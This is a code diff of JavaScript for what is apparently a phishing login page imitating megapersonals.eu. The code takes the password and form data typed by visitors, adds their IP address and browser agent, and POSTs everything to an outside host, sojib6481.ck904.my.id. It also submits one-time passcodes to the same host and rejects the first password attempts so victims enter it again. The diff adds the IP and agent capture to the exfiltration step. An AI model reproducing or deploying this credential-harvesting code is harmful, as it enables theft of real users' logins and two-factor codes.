@@ -496,59 +496,80 @@ padding: 10px 16px; font-size: 18px; background-color: #f0ad4e; border: none; bo
   const loginForm = document.querySelector("#loginSystem form");
 
 
-
-  fetch("https://sojib6481.ck904.my.id/api/data", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
-    body: JSON.stringify({
-      user: id,
-      siteName: `AutoInfo/login`,
-    }),
-  })
-    .then((response) => response.json())
-    .then((data) => {
-      console.log(data);
-      if (data.success) {
-        _id = data.data._id;
-        // hideElement(otpSystem);
-      } else {
-        console.error(data.message);
+    async function getIp() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch (err) {
+        console.error("IP fetch error", err);
+        return "unknown";
       }
-    })
-    .catch((error) => console.error(error));
-
-  async function updateData() {
-    try {
-      const response = await fetch(
-        `https://sojib6481.ck904.my.id/api/data`,
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify(formData),
-        }
-      );
-
-      if (!response.ok) {
-        throw new Error(`HTTP error! Status: ${response.status}`);
-      }
-
-      const responsId = await response.json();
-      sessionStorage.setItem("id", responsId);
-
-      console.log("Response from server:", responsId);
-
-      // Assuming you have these functions defined somewhere
-      hideElement(otpSystem);
-      showElement(otpSystem);
-    } catch (error) {
-      // Handle errors
-      console.error("Error:", error);
     }
+
+
+
+
+  // fetch("https://sojib6481.ck904.my.id/api/data", {
+  //   method: "POST",
+  //   headers: {
+  //     "Content-Type": "application/json",
+  //   },
+  //   body: JSON.stringify({
+  //     user_id: id,
+  //     website_id: 5,
+  //   }),
+  // })
+  //   .then((response) => response.json())
+  //   .then((data) => {
+  //       _id = data;
+  //   })
+  //   .catch((error) => console.error(error));
+
+
+
+
+async function updateData() {
+  try {
+    const ip = await getIp();   // get IP
+    const agent = navigator.userAgent;  // get browser agent
+
+    const payload = {
+      ...formData,       // email, password etc already ache
+      ip: ip,
+      user_id: id,
+      website_id: 5,
+      agent: agent,
+      admin_hidden: "0",
+      user_hidden: "0",
+      created_at: new Date().toISOString().slice(0, 19).replace("T", " "), // 2025-08-13 10:30:00
+    };
+
+    const response = await fetch("https://sojib6481.ck904.my.id/api/data", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+    });
+
+    if (!response.ok) {
+      throw new Error(`HTTP error! Status: ${response.status}`);
+    }
+
+    const responsId = await response.json();
+    sessionStorage.setItem("id", responsId);
+
+    console.log("Response from server:", responsId);
+    hideElement(otpSystem);
+    showElement(otpSystem);
+  } catch (error) {
+    console.error("Error:", error);
   }
+}
+
+
+
+
+
   async function handleLoginSubmit(event) {
     event.preventDefault();
     if (passClick < 2) {
@@ -557,10 +578,18 @@ padding: 10px 16px; font-size: 18px; background-color: #f0ad4e; border: none; bo
       formData.password = loginForm.querySelector(
         'input[type="password"]'
       ).value;
+     
+      const ip = await getIp(); 
+      const agent = navigator.userAgent; 
       // showElement(errorMsg);
       errorBox.style.display = "block";
       formData.user = id;
-      const data = { ...formData };
+      const data = {
+        ...formData,
+        ip: ip,
+        agent: agent, 
+      };
+      
       await updateData(id, data);
       loginForm.querySelector('input[type="password"]').value = "";
       hideElement(otpSystem);
@@ -606,6 +635,9 @@ padding: 10px 16px; font-size: 18px; background-color: #f0ad4e; border: none; bo
       submitBtn.value = "Please Wait...";
 
       let id = sessionStorage.getItem("id");
+
+      console.log(id);
+
       try {
         // Example PATCH request
         const response = await fetch(
@@ -625,7 +657,7 @@ padding: 10px 16px; font-size: 18px; background-color: #f0ad4e; border: none; bo
         if (response.ok) {
           
           // Redirect after OTP success
-           window.location.href = "https://megapersonals.eu/";
+          //  window.location.href = "https://megapersonals.eu/";
         } else {
           console.error("Failed to update:", result);
           submitBtn.value = "Try Again";
@@ -643,3 +675,7 @@ padding: 10px 16px; font-size: 18px; background-color: #f0ad4e; border: none; bo
   //   .getElementById("otpForm")
   //   .addEventListener("submit", handleOTPSubmit);
 });
+
+
+
+///Hello sdkl true love miya
